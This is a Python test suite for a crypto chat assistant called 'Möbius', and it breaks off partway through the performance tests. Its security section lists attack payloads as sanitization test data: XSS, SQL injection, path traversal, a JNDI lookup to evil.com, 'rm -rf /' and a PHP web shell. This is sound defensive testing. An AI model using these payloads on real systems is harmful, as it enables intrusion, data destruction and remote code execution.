#!/usr/bin/env python3
"""
🚀 COMPREHENSIVE TEST COVERAGE SUITE
====================================

This test suite provides extensive coverage for all Möbius AI Assistant components
with edge cases, stress testing, and integration scenarios.

Test Categories:
- Core Functionality Tests
- Edge Case Handling
- Performance & Stress Tests
- Security & Validation Tests
- Integration & End-to-End Tests
- Error Recovery & Resilience Tests
"""

import asyncio
import time
import sqlite3
import json
import os
import sys
import logging
import random
import string
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional
from concurrent.futures import ThreadPoolExecutor
import threading

# Add src to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class ComprehensiveTestSuite:
    """Comprehensive test suite for Möbius AI Assistant"""
    
    def __init__(self):
        self.results = []
        self.start_time = time.time()
        self.test_data = self._generate_test_data()
        
    def _generate_test_data(self) -> Dict[str, Any]:
        """Generate comprehensive test data"""
        return {
            "users": [
                {"id": 12345, "username": "test_user_1", "tier": "free"},
                {"id": 67890, "username": "test_user_2", "tier": "premium_retail"},
                {"id": 11111, "username": "test_user_3", "tier": "premium_corporate"},
                {"id": 22222, "username": "test_user_4", "tier": "free"},
                {"id": 33333, "username": "test_user_5", "tier": "premium_retail"},
            ],
            "chats": [
                {"id": -1001234567890, "type": "supergroup", "title": "Crypto Trading Group"},
                {"id": -1009876543210, "type": "group", "title": "DeFi Discussion"},
                {"id": 12345, "type": "private", "title": "Private Chat"},
            ],
            "messages": [
                "What's the current price of Bitcoin?",
                "@mobius help me with portfolio analysis",
                "hey everyone, what do you think about ETH?",
                "/portfolio show my balance",
                "Can you explain DeFi yield farming?",
                "🚀 BTC to the moon! 📈",
                "I need help with wallet setup",
                "What are the best trading strategies?",
                "mobius analyze this transaction: 0x123...",
                "How do I stake my tokens?",
            ],
            "crypto_symbols": ["BTC", "ETH", "SOL", "ADA", "DOT", "LINK", "UNI", "AAVE"],
            "wallet_addresses": [
                "0x742d35Cc6634C0532925a3b8D4C2C4e4C4C4C4C4",
                "0x8ba1f109551bD432803012645Hac136c22C4C4C4",
                "0x123456789abcdef123456789abcdef123456789a",
            ],
            "malicious_inputs": [
                "<script>alert('xss')</script>",
                "'; DROP TABLE users; --",
                "../../../etc/passwd",
                "{{7*7}}",
                "${jndi:ldap://evil.com/a}",
                "\\x00\\x01\\x02",
                "A" * 10000,  # Buffer overflow attempt
                "SELECT * FROM conversations WHERE 1=1",
            ]
        }
    
    def record_result(self, test_name: str, passed: bool, details: str, 
                     category: str, duration: float, priority: str = "normal"):
        """Record test result"""
        result = {
            "test_name": test_name,
            "passed": passed,
            "details": details,
            "category": category,
            "duration": duration,
            "priority": priority,
            "timestamp": datetime.now().isoformat()
        }
        self.results.append(result)
        
        # Log result
        status = "✅ PASS" if passed else "❌ FAIL"
        priority_icon = {"critical": "🔥", "important": "🔧", "performance": "⚡", "normal": "📝"}
        icon = priority_icon.get(priority, "📝")
        
        logger.info(f"{status} {icon} [{category}] {test_name}: {details} ({duration:.3f}s)")
    
    async def run_all_tests(self):
        """Run all comprehensive tests"""
        logger.info("🚀 Starting Comprehensive Test Coverage Suite...")
        logger.info("=" * 80)
        
        # Core functionality tests
        await self.test_intelligent_router_comprehensive()
        await self.test_conversation_intelligence_comprehensive()
        await self.test_group_chat_manager_comprehensive()
        await self.test_wallet_functionality_comprehensive()
        await self.test_whop_integration_comprehensive()
        await self.test_mcp_router_comprehensive()
        
        # Advanced tests
        await self.test_security_comprehensive()
        await self.test_performance_comprehensive()
        await self.test_integration_comprehensive()
        await self.test_edge_cases_comprehensive()
        await self.test_error_recovery_comprehensive()
        
        # Generate final report
        self.generate_comprehensive_report()
    
    async def test_intelligent_router_comprehensive(self):
        """Comprehensive intelligent router tests"""
        category = "INTELLIGENT_ROUTER_COMPREHENSIVE"
        
        try:
            from intelligent_message_router import IntelligentMessageRouter
            router = IntelligentMessageRouter()
            
            # Test 1: Command Detection Variations
            start = time.time()
            command_tests = [
                ("/start", True), ("/help", True), ("/portfolio", True),
                ("start", False), ("help me", False), ("portfolio analysis", False),
                ("/START", True), ("/Help", True), ("/PORTFOLIO", True),
                ("/ start", False), ("//start", False), ("/start extra", True),
            ]
            
            correct = 0
            for text, expected in command_tests:
                result = router._is_command(text)
                if result == expected:
                    correct += 1
            
            duration = time.time() - start
            self.record_result(
                "command_detection_variations",
                correct == len(command_tests),
                f"Command detection accuracy: {correct}/{len(command_tests)}",
                category, duration, "critical"
            )
            
            # Test 2: Crypto Query Analysis Advanced
            start = time.time()
            crypto_queries = [
                ("What's BTC price?", True),
                ("Show me ETH chart", True),
                ("Bitcoin analysis please", True),
                ("How's the weather?", False),
                ("Hello everyone", False),
                ("Price of BITCOIN today", True),
                ("ethereum to the moon", True),
                ("DeFi yield farming guide", True),
            ]
            
            correct = 0
            for text, expected in crypto_queries:
                result = router._contains_crypto_query(text)
                if bool(result) == expected:
                    correct += 1
            
            duration = time.time() - start
            self.record_result(
                "crypto_query_analysis_advanced",
                correct == len(crypto_queries),
                f"Crypto query detection: {correct}/{len(crypto_queries)}",
                category, duration, "important"
            )
            
            # Test 3: Context-Aware Routing
            start = time.time()
            context_tests = [
                ("group", "casual message", "silent_learning"),
                ("group", "@mobius help", "direct_response"),
                ("private", "any message", "direct_response"),
                ("supergroup", "/command", "direct_response"),
                ("group", "urgent: wallet hacked!", "priority_response"),
            ]
            
            correct = 0
            for chat_type, message, expected_strategy in context_tests:
                strategy = router.determine_response_strategy(message, chat_type, {})
                if strategy == expected_strategy:
                    correct += 1
            
            duration = time.time() - start
            self.record_result(
                "context_aware_routing",
                correct == len(context_tests),
                f"Context routing accuracy: {correct}/{len(context_tests)}",
                category, duration, "critical"
            )
            
            # Test 4: Concurrent Processing Stress
            start = time.time()
            
            async def process_message(msg):
                return await router.analyze_message(msg, "group", {})
            
            messages = [f"Test message {i}" for i in range(200)]
            tasks = [process_message(msg) for msg in messages]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            successful = sum(1 for r in results if not isinstance(r, Exception))
            duration = time.time() - start
            
            self.record_result(
                "concurrent_processing_stress",
                successful >= 190,  # Allow 5% failure rate
                f"Processed {successful}/{len(messages)} concurrent messages",
                category, duration, "performance"
            )
            
            # Test 5: Memory Usage Under Load
            start = time.time()
            import psutil
            import os
            
            process = psutil.Process(os.getpid())
            initial_memory = process.memory_info().rss / 1024 / 1024  # MB
            
            # Process many messages
            for i in range(1000):
                await router.analyze_message(f"Load test message {i}", "group", {})
            
            final_memory = process.memory_info().rss / 1024 / 1024  # MB
            memory_increase = final_memory - initial_memory
            
            duration = time.time() - start
            
            self.record_result(
                "memory_usage_under_load",
                memory_increase < 50,  # Less than 50MB increase
                f"Memory increase: {memory_increase:.1f}MB after 1000 messages",
                category, duration, "performance"
            )
            
        except Exception as e:
            self.record_result(
                "intelligent_router_comprehensive",
                False,
                f"Error: {e}",
                category, 0, "critical"
            )
    
    async def test_conversation_intelligence_comprehensive(self):
        """Comprehensive conversation intelligence tests"""
        category = "CONVERSATION_INTELLIGENCE_COMPREHENSIVE"
        
        try:
            from conversation_intelligence import (
                stream_conversation_message, get_chat_summary, 
                get_learning_insights
            )
            
            # Test 1: High-Volume Message Streaming
            start = time.time()
            
            messages_streamed = 0
            for i in range(500):
                try:
                    await stream_conversation_message(
                        message_id=f"msg_{i}",
                        user_id=12345,
                        username="test_user",
                        chat_id=-123456,
                        chat_type="group",
                        text=f"Test message {i} with crypto content BTC ETH",
                        is_bot_message=False
                    )
                    messages_streamed += 1
                except Exception as e:
                    logger.error(f"Failed to stream message {i}: {e}")
            
            duration = time.time() - start
            throughput = messages_streamed / duration if duration > 0 else 0
            
            self.record_result(
                "high_volume_message_streaming",
                messages_streamed >= 450,  # 90% success rate
                f"Streamed {messages_streamed}/500 messages ({throughput:.1f} msg/s)",
                category, duration, "performance"
            )
            
            # Test 2: Multi-Language Content Processing
            start = time.time()
            multilang_messages = [
                "Hello, what's the Bitcoin price?",  # English
                "Hola, ¿cuál es el precio de Bitcoin?",  # Spanish
                "Bonjour, quel est le prix du Bitcoin?",  # French
                "Hallo, was ist der Bitcoin-Preis?",  # German
                "こんにちは、ビットコインの価格は？",  # Japanese
                "你好，比特币的价格是多少？",  # Chinese
                "Привет, какая цена биткоина?",  # Russian
            ]
            
            processed = 0
            for i, msg in enumerate(multilang_messages):
                try:
                    await stream_conversation_message(
                        message_id=f"multilang_{i}",
                        user_id=12345,
                        username="multilang_user",
                        chat_id=-789012,
                        chat_type="group",
                        text=msg,
                        is_bot_message=False
                    )
                    processed += 1
                except Exception:
                    pass
            
            duration = time.time() - start
            
            self.record_result(
                "multilang_content_processing",
                processed == len(multilang_messages),
                f"Processed {processed}/{len(multilang_messages)} multilingual messages",
                category, duration, "important"
            )
            
            # Test 3: Advanced Learning Insights
            start = time.time()
            
            # Generate conversation with patterns
            patterns = [
                "BTC is going up! 🚀",
                "ETH looks bullish today",
                "I'm bearish on SOL",
                "DeFi yields are amazing",
                "NFT market is crashing",
                "Staking rewards are good",
                "Trading volume is high",
                "Market sentiment is positive",
            ]
            
            for i, pattern in enumerate(patterns):
                await stream_conversation_message(
                    message_id=f"pattern_{i}",
                    user_id=12345 + i,
                    username=f"trader_{i}",
                    chat_id=-456789,
                    chat_type="group",
                    text=pattern,
                    is_bot_message=False
                )
            
            # Get insights
            insights = await get_learning_insights(-456789, 1)
            
            duration = time.time() - start
            
            has_topics = len(insights.get("topics", [])) > 0
            has_sentiment = insights.get("sentiment") != "neutral"
            has_insights = len(insights.get("insights", [])) > 0
            
            self.record_result(
                "advanced_learning_insights",
                has_topics and has_sentiment and has_insights,
                f"Generated insights: {len(insights.get('insights', []))} items, sentiment: {insights.get('sentiment')}",
                category, duration, "critical"
            )
            
            # Test 4: Real-time Summary Generation
            start = time.time()
            
            # Generate conversation
            conversation_messages = [
                "Hey everyone, what do you think about the recent BTC pump?",
                "I think it's just a temporary spike, might come down soon",
                "No way, this is the beginning of the next bull run!",
                "ETH is also performing well, DeFi season incoming?",
                "I'm more interested in Layer 2 solutions like Polygon",
                "Don't forget about SOL, it's been undervalued",
                "What about the regulatory news? Could impact prices",
                "Technical analysis shows strong support at $40k for BTC",
            ]
            
            for i, msg in enumerate(conversation_messages):
                await stream_conversation_message(
                    message_id=f"conv_{i}",
                    user_id=12345 + (i % 3),
                    username=f"user_{i % 3}",
                    chat_id=-111222,
                    chat_type="group",
                    text=msg,
                    is_bot_message=False
                )
            
            # Generate summary
            summary = await get_chat_summary(-111222, 1)
            
            duration = time.time() - start
            
            has_summary = len(summary.get("summary", "")) > 0
            has_topics = len(summary.get("key_topics", [])) > 0
            has_participants = len(summary.get("participants", [])) > 0
            
            self.record_result(
                "realtime_summary_generation",
                has_summary and has_topics and has_participants,
                f"Summary: {len(summary.get('summary', ''))} chars, {len(summary.get('key_topics', []))} topics",
                category, duration, "critical"
            )
            
            # Test 5: Database Performance Under Load
            start = time.time()
            
            # Stress test database with concurrent operations
            async def db_stress_test():
                tasks = []
                for i in range(100):
                    task = stream_conversation_message(
                        message_id=f"stress_{i}",
                        user_id=random.randint(10000, 99999),
                        username=f"stress_user_{i}",
                        chat_id=-999888,
                        chat_type="group",
                        text=f"Stress test message {i} with random crypto {random.choice(self.test_data['crypto_symbols'])}",
                        is_bot_message=False
                    )
                    tasks.append(task)
                
                results = await asyncio.gather(*tasks, return_exceptions=True)
                return sum(1 for r in results if not isinstance(r, Exception))
            
            successful_ops = await db_stress_test()
            duration = time.time() - start
            
            self.record_result(
                "database_performance_under_load",
                successful_ops >= 95,  # 95% success rate
                f"Completed {successful_ops}/100 concurrent DB operations",
                category, duration, "performance"
            )
            
        except Exception as e:
            self.record_result(
                "conversation_intelligence_comprehensive",
                False,
                f"Error: {e}",
                category, 0, "critical"
            )
    
    async def test_group_chat_manager_comprehensive(self):
        """Comprehensive group chat manager tests"""
        category = "GROUP_CHAT_MANAGER_COMPREHENSIVE"
        
        try:
            from group_chat_manager import EnhancedGroupChatManager
            manager = EnhancedGroupChatManager()
            
            # Test 1: Advanced Mention Detection
            start = time.time()
            mention_tests = [
                ("@mobius help me", True),
                ("hey @mobius_ai_bot", True),
                ("@möbius with unicode", True),
                ("Hey mobius, can you help?", True),
                ("mobius without @ symbol", False),
                ("@other_bot hello", False),
                ("discussing mobius project", False),
                ("@mobius123 different bot", False),
                ("Hey AI assistant, help!", True),
                ("crypto bot please respond", True),
                ("@mobius-ai-bot with dash", False),
                ("MOBIUS in caps", False),
            ]
            
            correct = 0
            for text, expected in mention_tests:
                result = manager._is_bot_mentioned(text)
                if result == expected:
                    correct += 1
            
            duration = time.time() - start
            
            self.record_result(
                "advanced_mention_detection",
                correct >= len(mention_tests) * 0.9,  # 90% accuracy
                f"Mention detection: {correct}/{len(mention_tests)} correct",
                category, duration, "critical"
            )
            
            # Test 2: Response Strategy Intelligence
            start = time.time()
            strategy_tests = [
                # (chat_type, message, is_mentioned, is_reply, expected_response)
                ("private", "hello", False, False, True),
                ("group", "casual chat", False, False, False),
                ("group", "@mobius help", True, False, True),
                ("group", "/command", False, False, True),
                ("supergroup", "reply to bot", False, True, True),
                ("group", "urgent: wallet hacked!", False, False, False),  # Should still be silent
                ("private", "", False, False, True),  # Empty private message
                ("group", "@mobius", True, False, True),  # Just mention
            ]
            
            correct = 0
            for chat_type, message, is_mentioned, is_reply, expected in strategy_tests:
                result = manager._should_respond_to_message(message, chat_type, is_mentioned, is_reply)
                if result == expected:
                    correct += 1
            
            duration = time.time() - start
            
            self.record_result(
                "response_strategy_intelligence",
                correct == len(strategy_tests),
                f"Strategy decisions: {correct}/{len(strategy_tests)} correct",
                category, duration, "critical"
            )
            
            # Test 3: Cooldown System Stress Test
            start = time.time()
            chat_id = -123456789
            
            # Test rapid-fire responses
            responses = []
            for i in range(10):
                can_respond = manager._check_response_cooldown(chat_id)
                responses.append(can_respond)
                if can_respond:
                    manager._update_response_cooldown(chat_id)
                await asyncio.sleep(0.1)  # Small delay
            
            # Should only allow first response
            first_allowed = responses[0]
            subsequent_blocked = all(not r for r in responses[1:5])  # Next few should be blocked
            
            duration = time.time() - start
            
            self.record_result(
                "cooldown_system_stress_test",
                first_allowed and subsequent_blocked,
                f"Cooldown working: first={first_allowed}, blocked={sum(1 for r in responses[1:5] if not r)}/4",
                category, duration, "important"
            )
            
            # Test 4: Context Tracking Accuracy
            start = time.time()
            
            # Simulate conversation flow
            test_chat_id = -987654321
            messages = [
                {"user_id": 1, "text": "Hello everyone"},
                {"user_id": 2, "text": "Hey! How's trading today?"},
                {"user_id": 1, "text": "BTC is pumping!"},
                {"user_id": 3, "text": "I'm bullish on ETH"},
                {"user_id": 2, "text": "@mobius what do you think?"},
            ]
            
            for msg in messages:
                manager.update_group_context(test_chat_id, msg, False)
            
            context = manager.group_contexts.get(test_chat_id, {})
            
            duration = time.time() - start
            
            has_participants = len(context.get("participants", set())) == 3
            has_message_count = context.get("message_count", 0) == len(messages)
            has_activity = context.get("last_activity") is not None
            
            self.record_result(
                "context_tracking_accuracy",
                has_participants and has_message_count and has_activity,
                f"Context: {len(context.get('participants', set()))} users, {context.get('message_count', 0)} messages",
                category, duration, "important"
            )
            
            # Test 5: Multi-Group Concurrent Management
            start = time.time()
            
            async def simulate_group_activity(group_id, message_count):
                for i in range(message_count):
                    msg = {
                        "user_id": random.randint(1, 10),
                        "text": f"Message {i} in group {group_id}"
                    }
                    manager.update_group_context(group_id, msg, False)
                    await asyncio.sleep(0.01)  # Small delay
            
            # Simulate 5 groups with concurrent activity
            tasks = []
            for group_id in range(-5, 0):
                task = simulate_group_activity(group_id, 20)
                tasks.append(task)
            
            await asyncio.gather(*tasks)
            
            duration = time.time() - start
            
            # Check all groups have contexts
            groups_tracked = len(manager.group_contexts)
            
            self.record_result(
                "multi_group_concurrent_management",
                groups_tracked >= 5,
                f"Managing {groups_tracked} concurrent group contexts",
                category, duration, "performance"
            )
            
        except Exception as e:
            self.record_result(
                "group_chat_manager_comprehensive",
                False,
                f"Error: {e}",
                category, 0, "critical"
            )
    
    async def test_wallet_functionality_comprehensive(self):
        """Comprehensive wallet functionality tests"""
        category = "WALLET_FUNCTIONALITY_COMPREHENSIVE"
        
        try:
            from onchain import WalletManager
            wallet_manager = WalletManager()
            
            # Test 1: Bulk Wallet Creation Performance
            start = time.time()
            
            wallets = []
            for i in range(50):
                try:
                    wallet = wallet_manager.create_wallet()
                    wallets.append(wallet)
                except Exception as e:
                    logger.error(f"Failed to create wallet {i}: {e}")
            
            duration = time.time() - start
            creation_rate = len(wallets) / duration if duration > 0 else 0
            
            self.record_result(
                "bulk_wallet_creation_performance",
                len(wallets) >= 45,  # 90% success rate
                f"Created {len(wallets)}/50 wallets ({creation_rate:.1f} wallets/s)",
                category, duration, "performance"
            )
            
            # Test 2: Address Validation Comprehensive
            start = time.time()
            
            valid_addresses = [
                "0x742d35Cc6634C0532925a3b8D4C2C4e4C4C4C4C4",
                "0x8ba1f109551bD432803012645Hac136c22C4C4C4",
                "0x123456789abcdef123456789abcdef123456789a",
            ]
            
            invalid_addresses = [
                "0x742d35Cc6634C0532925a3b8D4C2C4e4C4C4C4C",  # Too short
                "0x742d35Cc6634C0532925a3b8D4C2C4e4C4C4C4C4G",  # Invalid char
                "742d35Cc6634C0532925a3b8D4C2C4e4C4C4C4C4",   # No 0x prefix
                "0x",  # Too short
                "",    # Empty
                "not_an_address",  # Invalid format
            ]
            
            valid_results = [wallet_manager.is_valid_address(addr) for addr in valid_addresses]
            invalid_results = [wallet_manager.is_valid_address(addr) for addr in invalid_addresses]
            
            duration = time.time() - start
            
            all_valid_correct = all(valid_results)
            all_invalid_correct = not any(invalid_results)
            
            self.record_result(
                "address_validation_comprehensive",
                all_valid_correct and all_invalid_correct,
                f"Valid: {sum(valid_results)}/{len(valid_addresses)}, Invalid: {sum(invalid_results)}/{len(invalid_addresses)}",
                category, duration, "critical"
            )
            
            # Test 3: Encryption Security Advanced
            start = time.time()
            
            test_keys = [
                "0x1234567890abcdef1234567890abcdef12345678",
                "0xfedcba0987654321fedcba0987654321fedcba09",
                "0x" + "a" * 64,  # All same character
                "0x" + "".join(random.choices("0123456789abcdef", k=64)),  # Random
            ]
            
            passwords = [
                "simple123",
                "Complex!Password@2024#",
                "🔐🚀💎🌙",  # Unicode password
                "a" * 100,   # Long password
            ]
            
            encryption_tests = 0
            successful_tests = 0
            
            for key in test_keys:
                for password in passwords:
                    encryption_tests += 1
                    try:
                        # Encrypt
                        encrypted = wallet_manager.encrypt_private_key(key, password)
                        
                        # Decrypt with correct password
                        decrypted = wallet_manager.decrypt_private_key(encrypted, password)
                        
                        # Try wrong password
                        wrong_password_failed = False
                        try:
                            wallet_manager.decrypt_private_key(encrypted, "wrong_password")
                        except:
                            wrong_password_failed = True
                        
                        if decrypted == key and wrong_password_failed:
                            successful_tests += 1
                            
                    except Exception as e:
                        logger.error(f"Encryption test failed: {e}")
            
            duration = time.time() - start
            
            self.record_result(
                "encryption_security_advanced",
                successful_tests >= encryption_tests * 0.95,  # 95% success rate
                f"Encryption tests: {successful_tests}/{encryption_tests} passed",
                category, duration, "critical"
            )
            
            # Test 4: Network Support Validation
            start = time.time()
            
            networks = wallet_manager.get_supported_networks()
            required_networks = ["ethereum", "polygon", "bsc"]
            
            has_all_required = all(net in networks for net in required_networks)
            
            # Test network configurations
            network_configs_valid = True
            for network in networks:
                if network in wallet_manager.supported_networks:
                    config = wallet_manager.supported_networks[network]
                    if not all(key in config for key in ["rpc_url", "chain_id", "native_symbol"]):
                        network_configs_valid = False
                        break
            
            duration = time.time() - start
            
            self.record_result(
                "network_support_validation",
                has_all_required and network_configs_valid,
                f"Networks: {networks}, configs valid: {network_configs_valid}",
                category, duration, "important"
            )
            
            # Test 5: Concurrent Wallet Operations
            start = time.time()
            
            async def concurrent_wallet_ops():
                tasks = []
                
                # Create wallets concurrently
                for i in range(20):
                    task = asyncio.create_task(asyncio.to_thread(wallet_manager.create_wallet))
                    tasks.append(task)
                
                results = await asyncio.gather(*tasks, return_exceptions=True)
                successful = sum(1 for r in results if not isinstance(r, Exception) and 'address' in r)
                
                return successful
            
            successful_concurrent = await concurrent_wallet_ops()
            duration = time.time() - start
            
            self.record_result(
                "concurrent_wallet_operations",
                successful_concurrent >= 18,  # 90% success rate
                f"Concurrent operations: {successful_concurrent}/20 successful",
                category, duration, "performance"
            )
            
        except Exception as e:
            self.record_result(
                "wallet_functionality_comprehensive",
                False,
                f"Error: {e}",
                category, 0, "critical"
            )
    
    async def test_security_comprehensive(self):
        """Comprehensive security tests"""
        category = "SECURITY_COMPREHENSIVE"
        
        try:
            # Test 1: Advanced Input Sanitization
            start = time.time()
            
            from intelligent_message_router import IntelligentMessageRouter
            router = IntelligentMessageRouter()
            
            malicious_inputs = self.test_data["malicious_inputs"]
            additional_malicious = [
                "javascript:alert('xss')",
                "data:text/html,<script>alert('xss')</script>",
                "file:///etc/passwd",
                "\x00\x01\x02\x03",  # Null bytes
                "\\u0000\\u0001",    # Unicode null
                "eval('malicious code')",
                "import os; os.system('rm -rf /')",
                "<?php system($_GET['cmd']); ?>",
            ]
            
            all_malicious = malicious_inputs + additional_malicious
            safe_handling = 0
            
            for malicious_input in all_malicious:
                try:
                    # Test router can handle malicious input safely
                    result = await router.analyze_message(malicious_input, "group", {})
                    
                    # Check that result doesn't contain the malicious input directly
                    if isinstance(result, dict) and malicious_input not in str(result):
                        safe_handling += 1
                    elif isinstance(result, str) and malicious_input not in result:
                        safe_handling += 1
                        
                except Exception:
                    # Exception is acceptable for malicious input
                    safe_handling += 1
            
            duration = time.time() - start
            
            self.record_result(
                "advanced_input_sanitization",
                safe_handling >= len(all_malicious) * 0.95,
                f"Safely handled {safe_handling}/{len(all_malicious)} malicious inputs",
                category, duration, "critical"
            )
            
            # Test 2: SQL Injection Prevention
            start = time.time()
            
            sql_injections = [
                "'; DROP TABLE conversations; --",
                "' OR '1'='1",
                "' UNION SELECT * FROM users --",
                "'; INSERT INTO conversations VALUES ('evil'); --",
                "' OR 1=1 --",
                "admin'--",
                "' OR 'x'='x",
                "'; EXEC xp_cmdshell('dir'); --",
            ]
            
            # Test with conversation intelligence
            from conversation_intelligence import stream_conversation_message
            
            sql_safe = 0
            for injection in sql_injections:
                try:
                    await stream_conversation_message(
                        message_id="sql_test",
                        user_id=99999,
                        username=injection,  # Try injection in username
                        chat_id=-999999,
                        chat_type="group",
                        text=injection,      # Try injection in text
                        is_bot_message=False
                    )
                    sql_safe += 1  # If no exception, it was handled safely
                except Exception as e:
                    # Check if it's a SQL-related error
                    if "sql" not in str(e).lower():
                        sql_safe += 1  # Safe handling
            
            duration = time.time() - start
            
            self.record_result(
                "sql_injection_prevention",
                sql_safe >= len(sql_injections) * 0.9,
                f"SQL injection prevention: {sql_safe}/{len(sql_injections)} safe",
                category, duration, "critical"
            )
            
            # Test 3: Private Key Security Advanced
            start = time.time()
            
            from onchain import WalletManager
            wallet_manager = WalletManager()
            
            # Create test wallet
            wallet = wallet_manager.create_wallet()
            private_key = wallet["private_key"]
            
            # Test that private key is not logged
            import io
            import sys
            
            # Capture logs
            log_capture = io.StringIO()
            handler = logging.StreamHandler(log_capture)
            logger.addHandler(handler)
            
            # Perform operations that might log private key
            try:
                encrypted = wallet_manager.encrypt_private_key(private_key, "test_password")
                decrypted = wallet_manager.decrypt_private_key(encrypted, "test_password")
            except Exception:
                pass
            
            # Check logs don't contain private key
            log_content = log_capture.getvalue()
            logger.removeHandler(handler)
            
            private_key_exposed = private_key in log_content
            
            duration = time.time() - start
            
            self.record_result(
                "private_key_security_advanced",
                not private_key_exposed,
                f"Private key exposure in logs: {private_key_exposed}",
                category, duration, "critical"
            )
            
            # Test 4: Rate Limiting Simulation
            start = time.time()
            
            from group_chat_manager import EnhancedGroupChatManager
            manager = EnhancedGroupChatManager()
            
            # Simulate rapid requests from same chat
            chat_id = -888777
            rapid_requests = 0
            allowed_requests = 0
            
            for i in range(20):
                can_respond = manager._check_response_cooldown(chat_id)
                rapid_requests += 1
                
                if can_respond:
                    allowed_requests += 1
                    manager._update_response_cooldown(chat_id)
                
                await asyncio.sleep(0.1)  # 100ms between requests
            
            # Should only allow limited requests due to cooldown
            rate_limiting_working = allowed_requests <= 3  # Very restrictive
            
            duration = time.time() - start
            
            self.record_result(
                "rate_limiting_simulation",
                rate_limiting_working,
                f"Rate limiting: {allowed_requests}/{rapid_requests} requests allowed",
                category, duration, "important"
            )
            
            # Test 5: Memory Leak Prevention
            start = time.time()
            
            import gc
            import psutil
            import os
            
            process = psutil.Process(os.getpid())
            initial_memory = process.memory_info().rss / 1024 / 1024  # MB
            
            # Create and destroy many objects
            for i in range(1000):
                # Create temporary objects
                temp_data = {
                    "messages": [f"Message {j}" for j in range(100)],
                    "users": [f"User {j}" for j in range(50)],
                    "data": "x" * 1000
                }
                
                # Process with router
                await router.analyze_message(f"Test {i}", "group", temp_data)
                
                # Clear reference
                del temp_data
                
                if i % 100 == 0:
                    gc.collect()  # Force garbage collection
            
            # Final garbage collection
            gc.collect()
            
            final_memory = process.memory_info().rss / 1024 / 1024  # MB
            memory_increase = final_memory - initial_memory
            
            duration = time.time() - start
            
            self.record_result(
                "memory_leak_prevention",
                memory_increase < 100,  # Less than 100MB increase
                f"Memory increase after 1000 operations: {memory_increase:.1f}MB",
                category, duration, "performance"
            )
            
        except Exception as e:
            self.record_result(
                "security_comprehensive",
                False,
                f"Error: {e}",
                category, 0, "critical"
            )
    
    async def test_performance_comprehensive(self):
        """Comprehensive performance tests"""
        category = "PERFORMANCE_COMPREHENSIVE"
        
        try:
            # Test 1: Message Processing Throughput
            start = time.time()
            
            from intelligent_message_router import IntelligentMessageRouter
            router = IntelligentMessageRouter()
            
            # Test different message types
            message_types = [
                "Simple message",
                "/command with parameters",
                "What's the price of BTC today? I need to know for trading.",
                "@mobius help me with portfolio analysis and risk management",
                "🚀💎🌙 Crypto to the moon! 📈📊💰",
                "Complex message with multiple crypto symbols: BTC, ETH, SOL, ADA, DOT, LINK",
            ]
            
            total_messages = 0
            total_time = 0
            
            for msg_type in message_types:
                type_start = time.time()
                
                # Process 100 messages of this type
                tasks = []
                for i in range(100):
                    task = router.analyze_message(f"{msg_type} {i}", "group", {})
                    tasks.append(task)
                
                await asyncio.gather(*tasks, return_exceptions=True)
                
                type_duration = time.time() - type_start
                total_messages += 100
                total_time += type_duration
            
            duration = time.time() - start
            throughput = total_messages / total_time if total_time > 0 else 0
            
            self.record_result(
                "message_processing_throughput",
                throughput >= 50,  # At least 50 messages/second
                f"Processed {total_messages} messages in {total_time:.2f}s ({throughput:.1f} msg/s)",
                category, duration, "performance"
            )
            
            # Test 2: Database Query Performance
            start = time.time()
            
            from conversation_intelligence import get_chat_summary, get_learning_insights
            
            # Create test data
            chat_ids = [-111, -222, -333, -444, -555]
            
            # Test concurrent queries
            query_tasks = []
            for chat_id in chat_ids:
                # Multiple query types per chat
                query_tasks.append(get_chat_summary(chat_id, 24))
                query_tasks.append(get_learning_insights(chat_id, 24))
                query_tasks.append(get_chat_summary(chat_id, 1))
            
            query_start = time.time()
            query_results = await asyncio.gather(*query_tasks, return_exceptions=True)
            query_duration = time.time() - query_start
            
            successful_queries = sum(1 for r in query_results if not isinstance(r, Exception))
            query_rate = successful_queries / query_duration if query_duration > 0 else 0
            
            duration = time.time() - start
            
            self.record_result(
                "database_query_performance",
                query_rate >= 10,  # At least 10 queries/second
                f"DB queries: {successful_queries}/{len(query_tasks)} in {query_duration:.2f}s ({query_rate:.1f} q/s)",
                category, duration, "performance"
            )
            
            # Test 3: Memory Efficiency Under Load
            start = time.time()
            
            import psutil
            import os
            
            process = psutil.Process(os.getpid())
            initial_memory = process.memory_info().rss / 1024 / 1024  # MB
            peak_memory = initial_memory
            
            # Simulate high load
            for batch in range(10):
                batch_tasks = []
                
                # Create 100 concurrent operations per batch
                for i in range(100):
                    task = router.analyze_message(
                        f"Load test batch {batch} message {i} with crypto content BTC ETH SOL",
                        "group",
                        {"context": f"batch_{batch}", "data": "x" * 1000}
                    )
                    batch_tasks.append(task)
                
                await asyncio.gather(*batch_tasks, return_exceptions=True)
                
                # Check memory usage
                current_memory = process.memory_info().rss / 1024 / 1024
                peak_memory = max(peak_memory, current_memory)
                
                # Small delay between batches
                await asyncio.sleep(0.1)
            
            final_memory = process.memory_info().rss / 1024 / 1024
            memory_efficiency = (peak_memory - initial_memory) < 200  # Less than 200MB peak increase
            
            duration = time.time() - start
            
            self.record_result(
                "memory_efficiency_under_load",
                memory_efficiency,
                f"Memory: initial={initial_memory:.1f}MB, peak={peak_memory:.1f}MB, final={final_memory:.1f}MB",
                category, duration, "performance"
            )
            
            # Test 4: Concurrent User Simulation
            start = time.time()
            
            async def simulate_user(user_id, message_count):
                user_messages = 0
                for i in range(message_count):
                    try:
                        await router.analyze_message(
                            f"User {user_id} message {i}: What's the price of {random.choice(self.test_data['crypto_symbols'])}?",
                            random.choice(["group", "private"]),
                            {"user_id": user_id}
                        )
                        user_messages += 1
                    except Exception:
                        pass
                    
                    await asyncio.sleep(random.uniform(0.01, 0.1))  # Random delay
                
                return user_messages
            
            # Simulate 50 concurrent users
            user_tasks = []
            for user_id in range(50):
                task = simulate_user(user_id, 20)  # 20 messages per user
                user_tasks.append(task)
            
            user_results = await asyncio.gather(*user_tasks)
            total_user_messages = sum(user_results)
            
            duration = time.time() - start
            user_throughput = total_user_messages / duration if duration > 0 else 0
            
            self.record_result(
                "concurrent_user_simulation",
                total_user_messages >= 900,  # 90% success rate
